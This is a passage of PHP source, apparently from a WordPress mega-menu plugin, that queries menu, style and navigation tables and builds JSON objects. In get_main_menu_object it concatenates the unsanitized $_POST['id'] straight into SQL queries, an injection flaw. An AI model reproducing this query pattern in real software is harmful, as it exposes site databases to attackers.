<?php

	#UPDATE CLASS
	class hmenu_class_get extends hmenu_backend{
		
		#GET MENUS
		public function get_menus(){
			
			global $wpdb;
			
			$result = $wpdb->get_results("SELECT * FROM ". $wpdb->base_prefix ."hmenu_menu WHERE deleted = '0' ORDER BY created DESC");
				
			#CREATE OBJECT
			$menu_object = array(
				'menus'=> array()
			);
			
			if($result){
				foreach($result as $menu){
					array_push($menu_object['menus'], array(
						'status' => $this->convert_int(1),
						'menuId' => $this->convert_int($menu->menuId),
						'name' => htmlspecialchars($menu->name),					
						'autoLink' => $this->convert_int($menu->autoLink),
						'leftItems' => $menu->leftItems,
						'centerItems' => $menu->centerItems,
						'rightItems' => $menu->rightItems,
						'customLink' => $menu->customLink,
						'overwrite' => $menu->overwrite,
						'created' => $menu->created
					));
				}
			}
				
			echo json_encode($menu_object);
			
			exit();

		}	
		
		#GET PRESETS
		public function get_presets(){
			
			global $wpdb;
			
			$result = $wpdb->get_results("SELECT * FROM ". $wpdb->base_prefix ."hmenu_presets WHERE deleted = '0' ORDER BY created DESC");

			echo json_encode($result);
			
			exit();

		}	
		
		#GET LOCATIONS
		public function get_menu_locations(){
			
			global $wpdb;
			
			#CREATE LOCATION OBJECT
			$location_object = array(
				'locations'=> array()
			);
			
			$menus_locations = get_registered_nav_menus();
			
			foreach($menus_locations as $location => $description){
				array_push($location_object['locations'], array(
					'location' => $location
				));
			}
			
			echo json_encode($location_object);
			
			exit();

		}	
		
		#CONSTRUCT SELECT STATEMENT
		public function prefixed_table_fields_wildcard($table, $alias){
			
			#GLOBALS
			global $wpdb;
			
			$columns = $wpdb->get_results("SHOW COLUMNS FROM $table", ARRAY_A);
			$field_names = array();
			foreach ($columns as $column){
				$field_names[] = $column["Field"];
			}
			$prefixed = array();
			foreach ($field_names as $field_name){
				$prefixed[] = "`{$alias}`.`{$field_name}` AS `{$alias}_{$field_name}`";
			}
			return implode(", ", $prefixed);
			
		}		
		
		#MAIN OBJECT
		public function get_main_menu_object($menu_id = NULL, $js = true){
			
			#GLOBALS
			global $wpdb;
			
			#GET POST DATA
			$menu_to_fetch = $menu_id != NULL ? $menu_id : $_POST['id'];
				
			$result_small = $wpdb->get_results("
				SELECT					
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_menu', 'm') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_main_styles', 'ms') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_dropdown_styles', 'ds') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_styles', 'megs') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mobile_styles', 'mob') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_search', 'srch') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_font_styles', 'megf') ."
				FROM
					`". $wpdb->base_prefix ."hmenu_menu` `m`
					INNER JOIN `". $wpdb->base_prefix ."hmenu_main_styles` `ms` ON(`ms`.`menuId` = `m`.`menuId` AND `ms`.`deleted` = '0')
					INNER JOIN `". $wpdb->base_prefix ."hmenu_dropdown_styles` `ds` ON(`ds`.`menuId` = `m`.`menuId` AND `ds`.`deleted` = '0')
					INNER JOIN `". $wpdb->base_prefix ."hmenu_mega_styles` `megs` ON(`megs`.`menuId` = `m`.`menuId` AND `megs`.`deleted` = '0')	
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mobile_styles` `mob` ON(`mob`.`menuId` = `m`.`menuId` AND `mob`.`deleted` = '0')					
					INNER JOIN `". $wpdb->base_prefix ."hmenu_search` `srch` ON(`srch`.`menuId` = `m`.`menuId` AND `srch`.`deleted` = '0')
					INNER JOIN `". $wpdb->base_prefix ."hmenu_mega_font_styles` `megf` ON(`megf`.`megaStyleId` = `megs`.`megaStyleId` AND `megf`.`deleted` = '0')
				WHERE	
					`m`.`menuId` = ".$menu_to_fetch."
				AND				
					`m`.`deleted` = 0;
			", OBJECT);
			
			$result_big = $wpdb->get_results("
				SELECT
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_nav_items', 'ni') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_menu', 'mega') .",	
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_social', 'scl') .",					
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_blog', 'mega_blog') .",					
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_content', 'mega_cnt') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_contact', 'mega_tact') .",
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_map', 'mega_map') .",					
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_list', 'mega_lst') .",					
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_list_items', 'mega_lst_itm') .",					
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_image', 'mega_img') .",					
					". $this->prefixed_table_fields_wildcard($wpdb->base_prefix .'hmenu_mega_product', 'mega_prod') ."
				FROM
					`". $wpdb->base_prefix ."hmenu_nav_items` `ni`
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_menu` `mega` ON(`mega`.`navItemId` = `ni`.`navItemId` AND `mega`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_social` `scl` ON(`scl`.`menuId` = `ni`.`menuId` AND `scl`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_blog` `mega_blog` ON(`mega_blog`.`megaMenuId` = `mega`.`megaMenuId` AND `mega_blog`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_content` `mega_cnt` ON(`mega_cnt`.`megaMenuId` = `mega`.`megaMenuId` AND `mega_cnt`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_contact` `mega_tact` ON(`mega_tact`.`megaMenuId` = `mega`.`megaMenuId` AND `mega_tact`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_map` `mega_map` ON(`mega_map`.`megaMenuId` = `mega`.`megaMenuId` AND `mega_map`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_list` `mega_lst` ON(`mega_lst`.`megaMenuId` = `mega`.`megaMenuId` AND `mega_lst`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_list_items` `mega_lst_itm` ON(`mega_lst_itm`.`listId` = `mega_lst`.`listId` AND `mega_lst_itm`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_image` `mega_img` ON(`mega_img`.`megaMenuId` = `mega`.`megaMenuId` AND `mega_img`.`deleted` = '0')
					LEFT JOIN `". $wpdb->base_prefix ."hmenu_mega_product` `mega_prod` ON(`mega_prod`.`megaMenuId` = `mega`.`megaMenuId` AND `mega_prod`.`deleted` = '0')
				WHERE	
					`ni`.`menuId` = ".$menu_to_fetch."
				AND				
					`ni`.`deleted` = 0
				ORDER BY
					`ni`.`order` ASC,
					`scl`.`order` ASC;
			", OBJECT);
			
			#CREATE OBJECT
			$menu_object = array(
				'menu' => array(),
				'main_styles' => array(),
				'dropdown_styles' => array(),
				'mega_styles' => array(),
				'mobile_styles' => array(),
				'mega_font_styles' => array(),
				'search_styles' => array(),
				'nav_items' => array(),
				'social_items' => array(),
				'all_menus' => array()				
			);
			
			#GET ALL MENUS
			$menus = $wpdb->get_results("SELECT * FROM ". $wpdb->base_prefix ."hmenu_menu WHERE deleted = '0' ORDER BY created DESC");
			
			#PUSH ALL MENUS IN HERE, USED TO CHECK LOCATION SETTINGS IN INTEGRATION TAB
			if($menus){
				foreach($menus as $menu){
					array_push($menu_object['all_menus'], array(
						'name' => $menu->name,	
						'menuId' => $this->convert_int($menu->menuId),
						'overwrite' => $menu->overwrite
					));
				}
			}
			
			if($result_small){
				#POPULATE MENU NODE
				$menu_object['menu'] = array(
					'status' => $this->convert_int(1),
					'menuId' => $this->convert_int($result_small[0]->m_menuId),
					'name' => $result_small[0]->m_name,					
					'autoLink' => $this->convert_int($result_small[0]->m_autoLink),
					'leftItems' => $result_small[0]->m_leftItems,
					'centerItems' => $result_small[0]->m_centerItems,
					'rightItems' => $result_small[0]->m_rightItems,
					'customLink' => $result_small[0]->m_customLink,
					'overwrite' => $result_small[0]->m_overwrite,
					'created' => $result_small[0]->m_created
				);
				#MAIN STYLES NODE
				foreach($result_small as $styles){					
					$key = $this->search_array($menu_object['main_styles'],'mainStyleId',$styles->ms_mainStyleId);					
					if(!is_numeric($key)){
						#CREATE BEAUTIFUL JSON ARRAY OF MAIN STYLES OBJECT
						array_push($menu_object['main_styles'], array(
							'mainStyleId' => $styles->ms_mainStyleId,
							'menuId' => $styles->ms_menuId,
							'logo' => $this->convert_int($styles->ms_logo),
							'logoUrl' => $styles->ms_logoUrl,
							'logoLink' => $styles->ms_logoLink,
							'logoAlt' => $styles->ms_logoAlt,
							'logoLinkTarget' => $styles->ms_logoLinkTarget,
							'logoHeight' => $styles->ms_logoHeight,
							'mobileLogo' => $this->convert_int($styles->ms_mobileLogo),
							'mobileLogoUrl' => $styles->ms_mobileLogoUrl,
							'mobileLogoHeight' => $styles->ms_mobileLogoHeight,
							'search' => $this->convert_int($styles->ms_search),
							'menu' => $this->convert_int($styles->ms_menu),
							'social' => $this->convert_int($styles->ms_social),
							'cart' => $this->convert_int($styles->ms_cart),
							'menuBarDimentions' => $styles->ms_menuBarDimentions,
							'menuBarWidth' => $styles->ms_menuBarWidth,
							'menuBarHeight' => $styles->ms_menuBarHeight,
							'navBarDimentions' => $styles->ms_navBarDimentions,
							'navBarWidth' => $styles->ms_navBarWidth,
							'border' => $styles->ms_border,
							'borderColor' => $styles->ms_borderColor,
							'borderTransparency' => $styles->ms_borderTransparency,
							'borderType' => $styles->ms_borderType,
							'borderRadius' => $styles->ms_borderRadius,
							'shadow' => $styles->ms_shadow,
							'shadowRadius' => $styles->ms_shadowRadius,
							'shadowColor' => $styles->ms_shadowColor,
							'shadowTransparency' => $styles->ms_shadowTransparency,
							'bgMenuStartColor' => $styles->ms_bgMenuStartColor,
							'bgMenuGradient' => $styles->ms_bgMenuGradient,
							'bgMenuEndColor' => $styles->ms_bgMenuEndColor,
							'bgMenuGradientPath' => $styles->ms_bgMenuGradientPath,
							'bgMenuTransparency' => $styles->ms_bgMenuTransparency,
							'bgHoverStartColor' => $styles->ms_bgHoverStartColor,
							'bgHoverType' => $styles->ms_bgHoverType,
							'bgHoverGradient' => $styles->ms_bgHoverGradient,
							'bgHoverEndColor' => $styles->ms_bgHoverEndColor,
							'bgHoverGradientPath' => $styles->ms_bgHoverGradientPath,
							'bgHoverTransparency' => $styles->ms_bgHoverTransparency,
							'paddingLeft' => $styles->ms_paddingLeft,
							'paddingRight' => $styles->ms_paddingRight,
							'orientation' => $styles->ms_orientation,
							'verticalWidth' => $styles->ms_verticalWidth,
							'animation' => $styles->ms_animation,
							'animationDuration' => $styles->ms_animationDuration,
							'animationTrigger' => $styles->ms_animationTrigger,
							'animationTimeout' => $styles->ms_animationTimeout,
							'sticky' => $styles->ms_sticky,
							'stickyLogoActive' => $styles->ms_stickyLogoActive,
							'stickyUrl' => $styles->ms_stickyUrl,
							'stickyActivate' => $styles->ms_stickyActivate,
							'stickyHeight' => $styles->ms_stickyHeight,							
							'stickyFontColor' => $styles->ms_stickyFontColor,
							'stickyFontHoverColor' => $styles->ms_stickyFontHoverColor,
							'stickyFontSize' => $styles->ms_stickyFontSize,
							'stickyFontSizing' => $styles->ms_stickyFontSizing,
							'stickyFontWeight' => $styles->ms_stickyFontWeight,
							'stickyFontHoverDecoration' => $styles->ms_stickyFontHoverDecoration,							
							'bgStickyStart' => $styles->ms_bgStickyStart,
							'bgStickyEnd' => $styles->ms_bgStickyEnd,
							'stickyTransparency' => $styles->ms_stickyTransparency,
							'devider' => $styles->ms_devider,
							'deviderTransparency' => $styles->ms_deviderTransparency,							
							'deviderColor' => $styles->ms_deviderColor,
							'deviderSizing' => $styles->ms_deviderSizing,
							'groupDevider' => $styles->ms_groupDevider,
							'groupTransparency' => $styles->ms_groupTransparency,							
							'groupColor' => $styles->ms_groupColor,
							'groupSizing' => $styles->ms_groupSizing,
							'responsiveLabel' => $styles->ms_responsiveLabel,
							'icons' => $styles->ms_icons,
							'iconsColor' => $styles->ms_iconsColor,
							'arrows' => $styles->ms_arrows,
							'arrowTransparency' => $styles->ms_arrowTransparency,
							'arrowColor' => $styles->ms_arrowColor,
							'fontFamily' => $styles->ms_fontFamily,
							'fontColor' => $styles->ms_fontColor,
							'fontHoverColor' => $styles->ms_fontHoverColor,
							'fontSize' => $styles->ms_fontSize,
							'fontSizing' => $styles->ms_fontSizing,
							'fontWeight' => $styles->ms_fontWeight,
							'fontDecoration' => $styles->ms_fontDecoration,
							'fontHoverDecoration' => $styles->ms_fontHoverDecoration,
							'zindex'  => $styles->ms_zindex,
							'preset'  => $styles->ms_preset,
							'presetSlug'  => $styles->ms_presetSlug,
							'iconProductSize'  => $styles->ms_iconProductSize,
							'iconProductColor'  => $styles->ms_iconProductColor,
							'iconProductHoverColor'  => $styles->ms_iconProductHoverColor,
							'siteResponsive'  => $styles->ms_siteResponsive,		
							'siteResponsiveOne'  => $styles->ms_siteResponsiveOne,
							'siteResponsiveTwo'  => $styles->ms_siteResponsiveTwo,
							'siteResponsiveThree'  => $styles->ms_siteResponsiveThree,
							'logoPaddingLeft'  => $styles->ms_logoPaddingLeft,
							'mobileLogoPaddingLeft'  => $styles->ms_mobileLogoPaddingLeft,
							'stickyLogoPaddingLeft'  => $styles->ms_stickyLogoPaddingLeft,
							'bgMainImage' => $styles->ms_bgMainImage,
							'bgMainImageUrl' => $styles->ms_bgMainImageUrl,
							'bgMainImagePosition' => $styles->ms_bgMainImagePosition,
							'bgMainImageRepeat' => $styles->ms_bgMainImageRepeat,
							'customCss' => $styles->ms_customCss
						));
					}					
				}
				#DROPDOWN STYLES
				foreach($result_small as $drop_styles){					
					$key = $this->search_array($menu_object['dropdown_styles'],'dropStyleId',$drop_styles->ds_dropStyleId);					
					if(!is_numeric($key)){
						#CREATE BEAUTIFUL JSON ARRAY OF DROPDOWN STYLES OBJECT
						array_push($menu_object['dropdown_styles'], array(
							'dropStyleId' => $drop_styles->ds_dropStyleId,
							'menuId' => $drop_styles->ds_menuId,
							'widthType' => $drop_styles->ds_widthType,
							'width' => $drop_styles->ds_width,
							'padding' => $drop_styles->ds_padding,  
							'border' => $drop_styles->ds_border,
							'borderColor' => $drop_styles->ds_borderColor,
							'borderTransparency' => $drop_styles->ds_borderTransparency,
							'borderType' => $drop_styles->ds_borderType,
							'borderRadius' => $drop_styles->ds_borderRadius	,	  
							'shadow' => $drop_styles->ds_shadow,
							'shadowRadius' => $drop_styles->ds_shadowRadius,
							'shadowColor' => $drop_styles->ds_shadowColor,	
							'shadowTransparency' => $drop_styles->ds_shadowTransparency,  
							'bgDropStartColor' => $drop_styles->ds_bgDropStartColor,
							'bgDropGradient' => $drop_styles->ds_bgDropGradient,
							'bgDropEndColor' => $drop_styles->ds_bgDropEndColor,
							'bgDropGradientPath' => $drop_styles->ds_bgDropGradientPath,
							'bgDropTransparency' => $drop_styles->ds_bgDropTransparency, 
							'bgHoverStartColor' => $drop_styles->ds_bgHoverStartColor, 
							'bgHoverGradient' => $drop_styles->ds_bgHoverGradient,
							'bgHoverEndColor' => $drop_styles->ds_bgHoverEndColor, 
							'bgHoverGradientPath' => $drop_styles->ds_bgHoverGradientPath,
							'bgHoverTransparency' => $drop_styles->ds_bgHoverTransparency, 		  
							'arrows' => $drop_styles->ds_arrows, 
							'arrowTransparency' => $drop_styles->ds_arrowTransparency, 
							'arrowColor' => $drop_styles->ds_arrowColor, 		  
							'devider' => $drop_styles->ds_devider, 
							'deviderTransparency' => $drop_styles->ds_deviderTransparency, 
							'deviderColor' => $drop_styles->ds_deviderColor, 		  
							'fontFamily' => $drop_styles->ds_fontFamily, 
							'fontColor' => $drop_styles->ds_fontColor, 
							'fontHoverColor' => $drop_styles->ds_fontHoverColor, 
							'fontSize' => $drop_styles->ds_fontSize,
							'fontSizing' => $drop_styles->ds_fontSizing, 
							'fontWeight' => $drop_styles->ds_fontWeight, 
							'fontDecoration' => $drop_styles->ds_fontDecoration, 
							'fontHoverDecoration' => $drop_styles->ds_fontHoverDecoration							
						));
					}					
				}
				#MEGA STYLES
				foreach($result_small as $mega_styles){					
					$key = $this->search_array($menu_object['mega_styles'],'megaStyleId',$mega_styles->megs_megaStyleId);					
					if(!is_numeric($key)){
						#CREATE BEAUTIFUL JSON ARRAY OF MEGA STYLES OBJECT
						array_push($menu_object['mega_styles'], array(
							'megaStyleId' => $mega_styles->megs_megaStyleId,
							'menuId' => $mega_styles->megs_menuId,
							'widthType' => $mega_styles->megs_widthType,
							'width' => $mega_styles->megs_width,
							'padding' => $mega_styles->megs_padding,  
							'border' => $mega_styles->megs_border,
							'borderColor' => $mega_styles->megs_borderColor,
							'borderTransparency' => $mega_styles->megs_borderTransparency,
							'borderType' => $mega_styles->megs_borderType,
							'borderRadius' => $mega_styles->megs_borderRadius,	  
							'shadow' => $mega_styles->megs_shadow,
							'shadowRadius' => $mega_styles->megs_shadowRadius,
							'shadowColor' => $mega_styles->megs_shadowColor,	
							'shadowTransparency' => $mega_styles->megs_shadowTransparency,	   
							'bgDropStartColor' => $mega_styles->megs_bgDropStartColor,
							'bgDropGradient' => $mega_styles->megs_bgDropGradient,
							'bgDropEndColor' => $mega_styles->megs_bgDropEndColor,
							'bgDropGradientPath' => $mega_styles->megs_bgDropGradientPath,
							'bgDropTransparency' => $mega_styles->megs_bgDropTransparency, 
							'bgHoverStartColor' => $mega_styles->megs_bgHoverStartColor, 
							'bgHoverGradient' => $mega_styles->megs_bgHoverGradient,
							'bgHoverEndColor' => $mega_styles->megs_bgHoverEndColor, 
							'bgHoverGradientPath' => $mega_styles->megs_bgHoverGradientPath,
							'bgHoverTransparency' => $mega_styles->megs_bgHoverTransparency, 		  
							'arrows' => $mega_styles->megs_arrows, 
							'arrowTransparency' => $mega_styles->megs_arrowTransparency, 
							'arrowColor' => $mega_styles->megs_arrowColor, 		  
							'devider' => $mega_styles->megs_devider, 
							'deviderTransparency' => $mega_styles->megs_deviderTransparency, 
							'deviderColor' => $mega_styles->megs_deviderColor,
							'fontHoverColor' => $mega_styles->megs_fontHoverColor,
							'fontHoverDecoration' => $mega_styles->megs_fontHoverDecoration	
						));
					}					
				}
				#MOBILE STYLES
				foreach($result_small as $mobile_styles){					
					$key = $this->search_array($menu_object['mobile_styles'],'mobileStyleId',$mobile_styles->mob_mobileStyleId);					
					if(!is_numeric($key)){
						#CREATE BEAUTIFUL JSON ARRAY OF MEGA STYLES OBJECT
						array_push($menu_object['mobile_styles'], array(
							'mobileStyleId' => $mobile_styles->mob_mobileStyleId,
							'menuId' => $mobile_styles->mob_menuId,
							'bgBarStartColor' => $mobile_styles->mob_bgBarStartColor,
						    'bgBarGradient' => $mobile_styles->mob_bgBarGradient,
						    'bgBarEndColor' => $mobile_styles->mob_bgBarEndColor,
						    'bgBarGradientPath' => $mobile_styles->mob_bgBarGradientPath,
						    'bgBarTransparency' => $mobile_styles->mob_bgBarTransparency,
						    'fontBarFamily' => $mobile_styles->mob_fontBarFamily,
						    'fontBarColor' => $mobile_styles->mob_fontBarColor,
						    'fontBarHoverColor' => $mobile_styles->mob_fontBarHoverColor,
						    'fontBarSize' => $mobile_styles->mob_fontBarSize,
						    'fontBarSizing' => $mobile_styles->mob_fontBarSizing,
						    'fontBarWeight' => $mobile_styles->mob_fontBarWeight,
						    'bgMenuStartColor' => $mobile_styles->mob_bgMenuStartColor,
						    'bgMenuGradient' => $mobile_styles->mob_bgMenuGradient,
						    'bgMenuEndColor' => $mobile_styles->mob_bgMenuEndColor,
						    'bgMenuGradientPath' => $mobile_styles->mob_bgMenuGradientPath,
						    'bgMenuTransparency' => $mobile_styles->mob_bgMenuTransparency,
						    'bgHoverStartColor' => $mobile_styles->mob_bgHoverStartColor,
						    'bgHoverGradient' => $mobile_styles->mob_bgHoverGradient,
						    'bgHoverEndColor' => $mobile_styles->mob_bgHoverEndColor,
						    'bgHoverGradientPath' => $mobile_styles->mob_bgHoverGradientPath,
						    'bgHoverTransparency' => $mobile_styles->mob_bgHoverTransparency,
						    'fontMobileFamily' => $mobile_styles->mob_fontMobileFamily,
						    'fontMobileColor' => $mobile_styles->mob_fontMobileColor,
						    'fontMobileHoverColor' => $mobile_styles->mob_fontMobileHoverColor,
						    'fontMobileSize' => $mobile_styles->mob_fontMobileSize,
						    'fontMobileSizing' => $mobile_styles->mob_fontMobileSizing,
						    'fontMobileWeight' => $mobile_styles->mob_fontMobileWeight,
						    'fontTabletFamily' => $mobile_styles->mob_fontTabletFamily,
						    'fontTabletColor' => $mobile_styles->mob_fontTabletColor,
						    'fontTabletHoverColor' => $mobile_styles->mob_fontTabletHoverColor,
						    'fontTabletSize' => $mobile_styles->mob_fontTabletSize,
						    'fontTabletSizing' => $mobile_styles->mob_fontTabletSizing,
						    'fontTabletWeight' => $mobile_styles->mob_fontTabletWeight,
						    'paddingLeft' => $mobile_styles->mob_paddingLeft,
							'paddingRight' => $mobile_styles->mob_paddingRight
						));
					}					
				}
				#MEGA FONT STYLES
				foreach($result_small as $mega_font_styles){					
					$key = $this->search_array($menu_object['mega_font_styles'],'megaFontId',$mega_font_styles->megf_megaFontId);					
					if(!is_numeric($key)){
						#CREATE BEAUTIFUL JSON ARRAY OF MEGA FONT STYLES OBJECT
						array_push($menu_object['mega_font_styles'], array(
							'megaFontId' => $mega_font_styles->megf_megaFontId,
							'megaStyleId' => $mega_font_styles->megf_megaStyleId,
							'type' => $mega_font_styles->megf_type,
							'fontFamily' => $mega_font_styles->megf_fontFamily,
							'fontColor' => $mega_font_styles->megf_fontColor,
							'fontSize' => $mega_font_styles->megf_fontSize,
							'fontSizing' => $mega_font_styles->megf_fontSizing,
							'fontWeight' => $mega_font_styles->megf_fontWeight
						));
					}					
				}
				#SEARCH STYLES
				foreach($result_small as $search_styles){					
					$key = $this->search_array($menu_object['search_styles'],'searchId',$search_styles->srch_searchId);					
					if(!is_numeric($key)){
						#CREATE BEAUTIFUL JSON ARRAY OF MEGA STYLES OBJECT
						array_push($menu_object['search_styles'], array(
							'searchId' => $search_styles->srch_searchId,
							'menuId' => $search_styles->srch_menuId,
							'type' => $search_styles->srch_type,
							'icon' => $search_styles->srch_icon,
							'label' => $search_styles->srch_label,  
							'iconColor' => $search_styles->srch_iconColor,
							'iconHoverColor' => $search_styles->srch_iconHoverColor,
							'iconSize' => $search_styles->srch_iconSize,
							'animation' => $search_styles->srch_animation,
							'placement' => $search_styles->srch_placement,	  
							'padding' => $search_styles->srch_padding,
							'width' => $search_styles->srch_width,
							'height' => $search_styles->srch_height,	  
							'fontFamily' => $search_styles->srch_fontFamily,
							'fontColor' => $search_styles->srch_fontColor,
							'fontSize' => $search_styles->srch_fontSize,
							'fontSizing' => $search_styles->srch_fontSizing,
							'fontWeight' => $search_styles->srch_fontWeight, 
							'border' => $search_styles->srch_border, 
							'borderColor' => $search_styles->srch_borderColor,
							'borderTransparency' => $search_styles->srch_borderTransparency, 
							'borderRadius' => $search_styles->srch_borderRadius,
							'backgroundColor' => $search_styles->srch_backgroundColor,
							'placeholder' => $search_styles->srch_placeholder
						));
					}					
				}
				
				#NAV ITEMS VARIABLES
				$count = 0;
				$nav_item_array = array();
				
				#NAV ITEMS
				foreach($result_big as $nav_items){	
					
					#CREATE JSON ARRAY OF NAVIGATION ITEMS AND MEGA MENUS
					if($nav_items->ni_navItemId != NULL){	
						
						if(!in_array($nav_items->ni_navItemId, $nav_item_array)){
							
							array_push($nav_item_array, $this->convert_int($nav_items->ni_navItemId));
											
							$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)] = array(
								'navItemId' => $this->convert_int($nav_items->ni_navItemId),
								'parentNavId' => $this->convert_int($nav_items->ni_parentNavId),
								'postId' => $this->convert_int($nav_items->ni_postId),
								'title' => $nav_items->ni_title,
								'active' => $nav_items->ni_active,
								'activeMobile' => $nav_items->ni_activeMobile,
								'name' => $nav_items->ni_name,
								'icon' => $nav_items->ni_icon,
								'iconContent' => $nav_items->ni_iconContent,
								'iconColor' => $nav_items->ni_iconColor,
								'iconSize' => $nav_items->ni_iconSize,
								'link' => $nav_items->ni_link,
								'target' => $nav_items->ni_target,
								'order' => $this->convert_int($nav_items->ni_order),
								'type' => $nav_items->ni_type,
								'level' => $this->convert_int($nav_items->ni_level),
								'new' => 0,
								'status' => 0,
								'deleted' => $this->convert_int($nav_items->ni_deleted),
								'mega_menus' => array(),
								'method'  => $nav_items->ni_method,
								'methodReference'  => $nav_items->ni_methodReference
							);
						
						}
						
					}
					
				}
				
				#SOCIAL ITEMS
				foreach($result_big as $social_items){
					#CREATE JSON ARRAY OF NAVIGATION ITEMS AND MEGA MENUS
					if($social_items->scl_socialId != NULL){						
						$key = $this->search_array($menu_object['social_items'],'socialId',$social_items->scl_socialId);					
						if(!is_numeric($key)){
							#CREATE BEAUTIFUL JSON ARRAY
							array_push($menu_object['social_items'], array(
								'socialId' => $social_items->scl_socialId,
								'menuId' => $social_items->scl_menuId,
								'name' => $social_items->scl_name,
								'icon' => $social_items->scl_icon,
								'iconContent' => $social_items->scl_iconContent,  
								'iconSize' => $social_items->scl_iconSize,
								'iconColor' => $social_items->scl_iconColor,
								'iconHoverColor' => $social_items->scl_iconHoverColor,
								'link' => $social_items->scl_link,
								'target' => $social_items->scl_target,	  
								'order' => $this->convert_int($social_items->scl_order),
								'new' => 0,
								'deleted' => $this->convert_int($social_items->scl_deleted)
							));
						}		
					}
				}
				
				#MEGA MENU
				foreach($result_big as $nav_items){	
				
					if($nav_items->ni_navItemId != NULL){	
						
						if($nav_items->mega_megaMenuId != NULL && count($menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus']) < 1){
							
							if($nav_items->mega_megaMenuId != NULL){	
								
								array_push($menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'], array(
									'megaMenuId' => $this->convert_int($nav_items->mega_megaMenuId),
									'navItemId' => $this->convert_int($nav_items->mega_navItemId),
									'name' => $nav_items->mega_name,
									'layout' => $nav_items->mega_layout,
									'background' => $nav_items->mega_background,
									'backgroundUrl' => $nav_items->mega_backgroundUrl,
									'backgroundPosition' => $nav_items->mega_backgroundPosition,
									'mega_blog' => array(),
									'mega_content' => array(),
									'mega_contact' => array(),
									'mega_map' => array(),
									'mega_image' => array(),
									'mega_product' => array(),
									'mega_list' => array(),
									'mega_stuff' => array(),
									'new' => 0,
									'status' => 0,
									'deleted_items' => array(),
									'deleted' => $this->convert_int($nav_items->mega_deleted)
								));
								
							}							
							
						}
						
					}
				
				}
				
				#MEGA CONTENT
				foreach($result_big as $nav_items){	
				
					if($nav_items->ni_navItemId != NULL){	
					
						if(count($menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus']) > 0){
							
							#CONTENT
							if(!in_array($this->convert_int($nav_items->mega_cnt_contentId),$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_content'])){
								
								if($nav_items->mega_cnt_contentId != NULL){	
									
									$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_content'][$this->convert_int($nav_items->mega_cnt_contentId)] = array(
										'id' => $this->convert_int($nav_items->mega_cnt_contentId),
										'megaMenuId' => $this->convert_int($nav_items->mega_cnt_megaMenuId),
										'heading' => $nav_items->mega_cnt_heading,
										'headingUnderline' => $this->convert_int($nav_items->mega_cnt_headingUnderline),
										'text' => $nav_items->mega_cnt_text,										
										'textCount' => $this->convert_int($nav_items->mega_cnt_textCount),
										'textAlignment' => $nav_items->mega_cnt_textAlignment,			
										'paddingTop' => $this->convert_int($nav_items->mega_cnt_paddingTop),
										'paddingBottom' => $this->convert_int($nav_items->mega_cnt_paddingBottom),
										'placement' => $this->convert_int($nav_items->mega_cnt_placement),
										'type' => $nav_items->mega_cnt_type,										
										'deleted' => $this->convert_int($nav_items->mega_cnt_deleted),
										'new' => 0
									);
									
								}
								
							}
							
							#BLOG
							if(!in_array($this->convert_int($nav_items->mega_blog_megaBlogId), $menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_blog'])){
								
								if($nav_items->mega_blog_megaBlogId != NULL){
										
									$menu_object['nav_items'][$this->convert_int($nav_items->ni_navItemId)]['mega_menus'][0]['mega_blog'][$this->convert_int($nav_items->mega_blog_megaBlogId)] = array(
										'id' => $this->convert_int($nav_items->mega_blog_megaBlogId),
										'megaMenuId' => $this->convert_int($nav_items->mega_blog_megaMenuId),
										'termId' => $this->convert_int($nav_items->mega_blog_termId),
										'numberPosts' => $this->convert_int($nav_items->mega_blog_numberPosts),
										'heading' => $nav_items->mega_blog_heading,
										'headingUnderline' => $this->convert_int($nav_items->mega_blog_headingUnderline),
										'headingAllow' => $this->convert_int($nav_items->mega_blog_headingAllow),
										'description' => $this->convert_int($nav_items->mega_blog_description),
										'descriptionCount' => $this->convert_int($nav_items->mega_blog_descriptionCount),
										'featuredImage' => $this->convert_int($nav_items->mega_blog_featuredImage),
										'featuredSize' => $nav_items->mega_blog_featuredSize,
										'placement' => $this->convert_int($nav_items->mega_blog_placement),
										'type' => $nav_items->mega_blog_type,
